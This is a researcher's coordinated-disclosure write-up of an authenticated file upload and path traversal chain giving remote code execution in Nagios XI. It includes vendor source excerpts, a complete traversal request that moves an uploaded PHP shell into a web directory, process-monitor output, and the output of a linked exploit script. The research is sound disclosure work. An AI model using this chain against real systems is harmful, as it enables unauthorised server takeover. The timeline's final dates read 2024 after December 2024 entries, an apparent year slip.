---
title: Nagios XI Authenticated Arbitrary File Upload + Path Traversal leads to Remote Code Execution
layout: posts
---
## Overview
I recently noticed quite a few folks recently looked at Nagios XI. Some even pulled the obfuscated stuff apart which I thought was really awesome! I still need to wrap my head around that and actually try it sometime. For these vulns, I stuck to the plainly visible stuff along with some help from one of my favorite tools [pspy](https://github.com/DominicBreuker/pspy).

This RCE is a combination of, IMO, two vulnerabilities:
- An arbitrary file upload (basically zero impact by itself unless you want to dig into SNMP)
- A path traversal

I discovered the ability to upload arbitrary files through some functionality in the application for uploading mibs configurations. I could control all the file contents as well as the extension, but I could not traverse out of the location inside `/usr/share/snmp/mibs/`. So, that alone was not going to get me RCE.

Later on while testing some functionality in the snapshots feature with `pspy` running, I discovered one of the functions ran some shell commands to move `mv` a file and I could control the file extension, the originally uploaded file name combined with a traversal sequence, and then the final name along with a traversal sequence. This let me essentially move the file from the originally uploaded location `/usr/share/snmp/mibs/` to a web accessible location `/usr/local/nagiosxi/html/tools/`. Combine that with a PHP file and it results in authenticated RCE as the `www-data` user.

## Technical Details
### Arbitrary File Upload

Inside `/admin/mibs.php` the `route_request()` function is responsible for mapping functionality based on the `mode` HTTP parameter:

```

function route_request()
{
    global $request;

    $mode = '';
    if (isset($request['mode'])) {
        $mode = $request['mode'];    
    }

    switch ($mode) {
        case 'download':
            do_download();
            break;
        case 'upload':
            $mode = MIB_UPLOAD_DO_NOTHING;

            $process = false;
            if (isset($request["processMibCheck"])) {
                $process = $request["processMibCheck"];
            }

            if ($process) {
                $mode = get_processing_mode();
            }

            do_upload($mode);
            break;
        case 'delete':
            do_delete();
```

If the `mode` HTTP reuqest variable is set to `upload`, code flow enters the `case` for `upload`. Next a check is done for the `processMibCheck` variable. If this variable is not set, the `do_upload()` function is invoked. This function is on line 1091 in `/admin/mibs.php`:

```
function do_upload($mode) {

...Omitted for brevity...

    $_FILES['uploadedfile'] = rearrange_multiple_upload($_FILES['uploadedfile']);

    $error = false;
    foreach ($_FILES['uploadedfile'] as $file) {    

        $target_path = install_mib($file);

        mibs_add_entry($target_path);

        if ($mode == MIB_UPLOAD_DO_NOTHING) {
            continue;
        }
```

In this function, the uploaded files `$_FILES` from the `multipart/form-data` upload are iterated through as `$file` and the function `install_mib()` is called with the file object passed in. This function is defined on line 1185 and accepts a file object `$file_object`:

```
function install_mib($file_object) {

    $target_path = get_mib_dir();
    $target_path .= "/";
    $target_path .= basename(str_replace(array(" ", "`", "$", "(", ")"), "_", $file_object['name']));

    $error = $file_object['error'];
    if ($error == UPLOAD_ERR_OK) {
        $test_write = move_uploaded_file($file_object['tmp_name'], $target_path);
...Omitted for brevity...
```
This function does some santiization and resolves the file path to protect against directory traversal attacks. However, any extension and any file type is allowed to be uploaded, and the files ultimately are saved in `/usr/share/snmp/mibs` as the name passed via the `uploadedfile` `filename` parameter in the form upload.

Alone, there is not much security impact from a web perspective as this is not a web accessible location. I did not investigate anything from an SNMP standpoint.

### Path Traversal in shell command used for Renaming Snapshot Files

After identifying a vector to upload PHP files, a way to execute them via the web interface was required for impact. Before going too far into this path, we need to confirm there is a writable directory that is web accessible.

```
$ ls -lah /usr/local/nagiosxi/
total 40K
drwxr-xr-x 10 root     nagios 4.0K Oct 27 14:30 .
drwxr-xr-x 15 root     root   4.0K Oct 27 14:37 ..
drwxr-xr-x  2 root     nagios 4.0K Oct 27 14:30 cron
drwxr-xr-x  4 root     nagios 4.0K Oct 27 14:30 etc
drwxr-xr-x 21 root     nagios 4.0K Nov  3 14:25 html
drwxr-xr-x  3 root     nagios 4.0K Oct 27 14:30 nom
drwxr-xr-x  6 root     nagios 4.0K Oct 27 14:30 scripts
drwsrwsr-x  3 www-data nagios 4.0K Nov  3 18:31 tmp
drwxr-xr-x  2 root     nagios 4.0K Oct 27 14:30 tools
drwxrwxr-x  7 nagios   nagios 4.0K Nov  3 21:14 var
```

`/usr/local/nagiosxi/html` is only writable by `root`, however multiple subfolders are writable by the `nagios` user, which is what this command runs as as we'll see later:
```
 ls -lah /usr/local/nagiosxi/html/
total 1.2M
drwxr-xr-x 21 root   nagios 4.0K Nov  3 14:25 .
drwxr-xr-x 10 root   nagios 4.0K Oct 27 14:30 ..
drwxr-xr-x  2 nagios nagios 4.0K Oct 27 14:30 about
drwxr-xr-x  2 nagios nagios 4.0K Oct 27 14:30 account
drwxr-xr-x  2 nagios nagios 4.0K Oct 27 14:30 admin
...Omitted for brevity...
-rwxr-xr--  1 nagios nagios  12K Oct 27 14:30 suggest.php
-rw-r--r--  1 root   root     69 Oct 27 16:04 test2.php
-rw-r--r--  1 root   root    774 Oct 27 15:59 test.php
drwxr-xr-x  2 nagios nagios 4.0K Nov  3 19:45 tools
drwxr-xr-x  3 nagios nagios 4.0K Oct 27 14:30 ui
-rwxr-xr--  1 nagios nagios 107K Oct 27 14:30 upgrade.php
drwxr-xr-x  2 nagios nagios 4.0K Oct 27 14:30 views
```

We choose `/usr/local/nagiosxi/html/tools/` and move into exploring potential ways to get the uploaded PHP file into that directory.

Inside `/admin/coreconfigsnapshots.php`, multiple actions are available:
```
function route_request()
{
    global $request;

    if (isset($request["download"])) {
        do_download();
    } else if (isset($request["view"])) {
        do_view();
    } else if (isset($request["viewdiff"])) {
        $ts = grab_request_var('viewdiff', '');
        show_ccm_file_changes($ts);
    } else if (isset($request["currentdiff"])) {
        $ts = grab_request_var('currentdiff', '');
        $archive = grab_request_var('archive', 0);
        show_ccm_file_changes($ts, true, $archive);
    } else if (isset($request["delete"])) {
        do_delete();
    } else if (isset($request["doarchive"])) {
        do_archive();
    } else if (isset($request["restore"])) {
        do_restore();
    } else if (isset($request["rename"])) {
        do_rename();
    }

    show_log();
}
```

The `route_request()` function is responsible for mapping requests based on parameters set. In this case, we are interested in the `rename` parameter, which if set routes the request to the `do_rename()` function, which is defined on line 609:
```
function do_rename()
{

    $ts = grab_request_var("rename", "");
    $file = grab_request_var("file", "");
    $new_name = grab_request_var("new_name", "");
    $cancel = grab_request_var("cancel", 0);

    // Get actual name
    $name = sprintf(_('Snapshot %s'), $ts);
    if (strpos($file, '.') !== false) {
        $name = substr($file, 0, strpos($file, '.'));
    }

    if ($ts == '' || $file == '' || $cancel) {
        return;
    }

    if (!$new_name) {
...Omitted for brevity...
        <?php
        do_page_end(true);
        exit();

    } else {

        //
        // RENAME THE ARCHIVED SNAPSHOT
        //

        // Actually set the name!
        $command_data = array();
        $command_data[0] = str_replace(".tar.gz", "", $file);
        $command_data[1] = $new_name . "." . $ts;
        $command_data = serialize($command_data);

        // Send command to the subsystem
        $id = submit_command(COMMAND_RENAME_ARCHIVE_SNAPSHOT, $command_data);

        if ($id <= 0) {
...Omitted for brevity...
```

Three variables are set: `rename` -> `$ts`, `file` -> `$file`, and `new_name` -> `$new_name`. First, the name of the file minus the extension is retrieved from the `$file` parameter. Next, payload used to execute the shell command is created as an array `$command_data[]`. We can see `$command[0]` is the value of `$file` with the substring `.tar.gz` removed. We can also see `$command_data[1]` is set to `$new_name . $ts`, therefore the `rename` parameter ultimately ends up being the extension type. 

Finally, this array is passed to `serialize()` and then passed to the `submit_command()` function. This function is located within a source protected file, therefore the tool [pspy](https://github.com/DominicBreuker/pspy) was leveraged to observe shell commands executed.

When submitting a command such as the following:

```
http://192.168.122.248/nagiosxi/admin/coreconfigsnapshots.php?rename=php&file=../../../../../../../../../../../../../../usr/share/snmp/mibs/shell&new_name=/../../../../../../../../../usr/local/nagiosxi/html/tools/shell
```

The `pspy` output showed the following `mv` command:
```
2024/11/03 19:41:07 CMD: UID=1001  PID=142674 | mv /usr/local/nagiosxi/nom/checkpoints/nagioscore//archives/../../../../../../../../../../../../../../usr/share/snmp/mibs/shell.txt /usr/local/nagiosxi/nom/checkpoints/nagioscore//archives//../../../../../../../../../usr/local/nagiosxi/html/tools/shell.php.txt 
2024/11/03 19:41:07 CMD: UID=1001  PID=142675 | mv /usr/local/nagiosxi/nom/checkpoints/nagioscore//archives/../../../../../../../../../../../../../../usr/share/snmp/mibs/shell /usr/local/nagiosxi/nom/checkpoints/nagioscore//archives//../../../../../../../../../usr/local/nagiosxi/html/tools/shell.php 
2024/11/03 19:41:07 CMD: UID=1001  PID=142676 | mv /usr/local/nagiosxi/nom/checkpoints/nagioscore//../nagiosxi/archives/../../../../../../../../../../../../../../usr/share/snmp/mibs/shell_nagiosql.sql.gz /usr/local/nagiosxi/nom/checkpoints/nagioscore//../nagiosxi/archives//../../../../../../../../../usr/local/nagiosxi/html/tools/shell.php_nagiosql.sql.gz 
```
The second command is responsible for moving the `shell` file from `usr/share/snmp/mibs/shell` to `/usr/local/nagiosxi/html/tools/shell.php` due to the directory traversal sequences in `file` and `new_name`, and control of the file extension via the `rename` parameter.


## Proof of Concept

I would have done curl commands, however the `nsp` variable being required in POST requests made it a little more complicated...

The following script can be used to prove the vulnerability out using the following format (it is overly verbose for assistance in identifying/remediating the vulnerability):

```
$ python3 exploit.py http://192.168.122.248/nagiosxi/ nagiosadmin 'Passw0rd!' 'id'
[*] Making upload POST request to http://192.168.122.248/nagiosxi/admin/mibs.php
[+] Seems like upload worked
[*] Making snapshot move GET request to http://192.168.122.248/nagiosxi/admin/coreconfigsnapshots.php
[+] Seems like file move worked!
[*] Making shell request to http://192.168.122.248/nagiosxi/tools/shell.php
[*] Output
uid=33(www-data) gid=33(www-data) groups=33(www-data),114(Debian-snmp),1001(nagios),1002(nagcmd)
```
### Exploit source
The python script above `exploit.py` is available here: [nagios_path-traversal_rce.txt](/exploits/nagios_path-traversal_rce.txt)

## Conclusion

It's been a while since I found/reported something, so this was a fun one to get back in the saddle. I really enjoy stuff where it takes stringing a couple issues together to get impact! 

I also reported a SQL injection three days later, however it apparently was a duplicate report and patched in the release three days after my report, so nice work to whomever found it!

## References

- `https://www.nagios.com/changelog/`
- `https://www.nagios.com/products/security/`

## Timeline

|  Date  |  Update  | 
| :---: | :---------------: |
|**03NOV2024**|Issue reported to security@nagios.com|
|**05NOV2024**|Receipt of vulnerabilities acknowledged by Nagios| 
|**06DEC2024**|Requested update on vulnerabilities  
|**06DEC2024**|Nagios replies to notify that fixes will be relased and requested two weeks after patching before public disclosure of vulnerabilities 
|**12DEC2024**|Observed updates released at `https://www.nagios.com/changelog/`|
|**12DEC2024**| I requested a CVE for this issue via `https://cveform.mitre.org/`|
|**06JAN2024**| Confirmed with Nagios that public disclosure was in good faith with the elapsed time|
|**06JAN2024**|Nagios confirms full disclosure is OK| 
|**07JAN2024**|This article is published. CVE is still pending| 


